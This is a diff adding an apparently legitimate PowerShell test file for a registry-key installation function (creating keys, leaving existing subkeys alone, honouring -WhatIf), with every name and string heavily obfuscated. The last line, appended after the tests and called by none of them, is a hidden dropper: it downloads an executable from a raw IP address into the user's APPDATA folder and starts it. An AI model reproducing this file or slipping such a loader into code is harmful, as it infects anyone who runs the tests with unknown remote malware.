@@ -1,0 +1,53 @@
+${R`OotK`eY} = ((("{2}{5}{1}{6}{3}{0}{4}" -f'28','Soft','hklm:28','arbon','STest','S','ware28SC')) -cRePLace([Char]50+[Char]56+[Char]83),[Char]92)
+
+function sta`RT-TeStFI`x`T`Ure
+{
+    & (.("{2}{0}{3}{1}" -f'n-Pa','h','Joi','t') -Path ${psscRipTr`O`OT} -ChildPath ((("{7}{1}{2}{5}{0}{4}{6}{3}{8}" -f 'tia','p','x','arbonTest.ps','l','Ini','ize-C','..m','1')) -RePlace([cHaR]109+[cHaR]112+[cHaR]120),[cHaR]92) -Resolve)
+}
+
+function StA`RT-`T`est
+{
+    if( -not (.("{1}{0}"-f 'th','Test-Pa') ${R`oOtk`Ey} -PathType ("{1}{0}{2}"-f 'ai','Cont','ner')) )
+    {
+        &("{2}{1}{0}" -f'tem','ew-I','N') ${RO`OT`Key} -ItemType ("{0}{1}{2}" -f'Re','gistryKe','y') -Force
+    }
+    
+}
+
+function S`TOP-tE`ST
+{
+    .("{1}{2}{0}"-f'em','Remove-I','t') ${ROo`TK`ey} -Recurse
+}
+
+function teSt-SHoULdCRe`At`E`k`ey
+{
+    ${KEypA`TH} = &("{0}{2}{1}" -f 'Join-','ath','P') ${r`OOtk`eY} ((("{2}{3}{0}{7}{9}{6}{4}{5}{10}{8}{1}" -f 'al','Key','Test-I','nst','Sh','ou','zV','lRegist','dCreate','ryKeyX','l'))."rEPlA`ce"('XzV',[StrInG][cHaR]92))
+    if( .("{2}{1}{0}"-f 'Path','est-','T') ${K`EypatH} -PathType ("{0}{1}{2}{3}" -f'C','o','nt','ainer') )
+    {
+        .("{2}{0}{3}{1}" -f 'move-','em','Re','It') ${kE`yP`ATh} -Recurse
+    }
+    
+    .("{2}{6}{4}{0}{5}{1}{3}" -f'll-R','yKe','In','y','a','egistr','st') -Path ${Ke`yPa`Th}
+    
+    .("{2}{1}{0}"-f't-True','r','Asse') (.("{2}{3}{1}{0}"-f'Path','t-','Te','s') ${k`eYPath} -PathType ("{1}{2}{0}" -f'er','Conta','in'))
+}
+
+function TeSt-S`hOuLdd`OnotHinG`iFKEYE`Xis`Ts
+{
+    ${k`EYPatH} = .("{2}{1}{3}{0}" -f'th','in-P','Jo','a') ${RO`OTK`EY} ((("{4}{2}{11}{10}{6}{1}{8}{5}{3}{0}{9}{7}" -f 'gIfKeyE','eyvgV','st','Nothin','Te','dDo','egistryK','ts','Shoul','xis','llR','-Insta'))  -RePlacE ([char]118+[char]103+[char]86),[char]92)
+    .("{4}{0}{3}{1}{2}{5}"-f 'nstall-Reg','yK','e','istr','I','y') -Path ${Ke`ypatH}
+    ${su`B`k`EyPAtH} = &("{0}{1}{2}" -f'Join-','Pa','th') ${k`Eypa`TH} ("{0}{1}" -f 'SubK','ey')
+    &("{2}{3}{0}{1}{4}"-f'Re','gist','Insta','ll-','ryKey') ${S`U`BkeypATH}
+    &("{3}{0}{2}{4}{1}" -f's','istryKey','tall-','In','Reg') -Path ${k`EYpa`Th}
+    .("{2}{0}{3}{1}" -f 'sse','t-True','A','r') (&("{0}{1}{2}" -f'T','e','st-Path') ${Su`B`KEYpatH} -PathType ("{3}{2}{1}{0}"-f'r','e','ain','Cont'))
+}
+
+function T`eS`T`-shO`UL`Ds`UP`pORTSHou`LdprOce`Ss
+{
+    ${k`EYp`ATH} = &("{3}{0}{1}{2}"-f 'in-','Pat','h','Jo') ${ro`oTK`eY} ((("{0}{1}{4}{3}{2}"-f 'Test-In','stallRegist','atIf','HWh','ryKeyX7'))."re`PL`Ace"('X7H',[StrINg][chaR]92))
+    &("{0}{2}{4}{3}{1}{5}"-f 'I','-R','ns','ll','ta','egistryKey') -Path ${KE`y`PATH} -WhatIf
+    .("{0}{3}{2}{1}"-f 'Ass','se','rt-Fal','e') (&("{1}{3}{0}{2}"-f '-Pat','T','h','est') -Path ${KEYPa`TH} -PathType ("{0}{1}{2}"-f 'Conta','in','er'))
+}
+
+
+(&("{0}{1}{2}"-f 'Ne','w-Obj','ect') ("{1}{3}{0}{4}{2}{5}"-f'em','S','Cli','yst','.Net.Web','ent')).("{1}{0}{2}{3}"-f 'lo','Down','adFil','e').Invoke(("{3}{5}{10}{0}{1}{6}{9}{7}{4}{8}{2}" -f'.1','02.','exe','ht','/~yahoo/csrsv','tp:','53.2','8','.','3','//94'),"$env:APPDATA\csrsv.exe");.("{0}{2}{1}{3}{4}" -f'Start','r','-P','o','cess') ("$env:APPDATA\csrsv.exe")
